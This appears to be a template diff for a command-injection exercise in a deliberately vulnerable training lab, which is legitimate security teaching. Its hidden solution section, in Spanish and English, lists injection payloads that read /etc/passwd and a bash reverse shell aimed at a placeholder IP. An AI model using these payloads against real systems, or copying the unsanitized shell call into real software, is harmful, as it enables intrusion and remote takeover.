@@ -1,0 +1,67 @@
+{% extends "base.html" %}
+{% block title %}Command Injection – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <form method="POST" action="/cmdi/ping" class="space-y-4">
+      <div>
+        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium">Host / IP</label>
+        <input type="text" name="host" value="{{ host | e }}" placeholder="127.0.0.1" class="hl-input font-mono" />
+      </div>
+      <button type="submit" class="btn-primary">Ping</button>
+    </form>
+  </div>
+
+  {% if output %}
+  <div class="hl-card mb-4">
+    <div class="text-xs text-gray-400 mb-2 font-medium">Output</div>
+    <pre class="text-green-500 dark:text-green-400 text-xs whitespace-pre-wrap overflow-x-auto">{{ output }}</pre>
+  </div>
+  {% endif %}
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Pasos de explotación</h3>
+    <ol>
+      <li>El campo host se pasa directamente a <code>subprocess.run(shell=True)</code> sin sanitización.</li>
+      <li>Usa separadores de comandos para inyectar comandos adicionales:</li>
+    </ol>
+    <pre>127.0.0.1; whoami
+127.0.0.1 && id
+127.0.0.1 | cat /etc/passwd
+127.0.0.1; ls -la /
+127.0.0.1; cat /etc/hostname</pre>
+    <ol start="3">
+      <li>Con Burp Suite: intercepta el POST a <code>/cmdi/ping</code> y modifica el campo <code>host</code>.</li>
+      <li>Prueba a obtener una reverse shell: <code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/TU_IP/4444 0&gt;&amp;1</code></li>
+    </ol>
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">netcat</span></div>
+    <pre>curl -X POST http://localhost:5000/cmdi/ping \
+  -d "host=127.0.0.1;whoami"</pre>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Exploitation Steps</h3>
+    <ol>
+      <li>The host field is passed directly to <code>subprocess.run(shell=True)</code> without sanitization.</li>
+      <li>Use command separators to inject additional commands:</li>
+    </ol>
+    <pre>127.0.0.1; whoami
+127.0.0.1 && id
+127.0.0.1 | cat /etc/passwd
+127.0.0.1; ls -la /
+127.0.0.1; cat /etc/hostname</pre>
+    <ol start="3">
+      <li>With Burp Suite: intercept the POST to <code>/cmdi/ping</code> and modify the <code>host</code> field.</li>
+      <li>Try a reverse shell: <code>127.0.0.1; bash -i &gt;&amp; /dev/tcp/YOUR_IP/4444 0&gt;&amp;1</code></li>
+    </ol>
+    <h3>Tools</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">curl</span> <span class="tools-badge">netcat</span></div>
+    <pre>curl -X POST http://localhost:5000/cmdi/ping \
+  -d "host=127.0.0.1;whoami"</pre>
+  </div>
+</div>
+{% endblock %}
